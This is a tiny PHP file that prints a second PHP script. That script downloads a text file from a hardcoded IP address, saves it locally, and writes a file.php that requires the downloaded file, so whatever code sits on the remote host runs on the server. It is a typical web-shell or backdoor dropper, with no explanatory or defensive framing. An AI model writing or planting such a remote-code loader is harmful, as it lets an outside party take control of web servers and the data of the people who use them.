<?php
echo '<?php
$path = "file.txt";
$data = file_get_contents("http://121.40.188.41/js/a.txt");
file_put_contents($path,$data);
$npath = "file.php";
$ndata = "<?php require_once(\"file.txt\");?>";
file_put_contents($npath,$ndata);
?>';
?>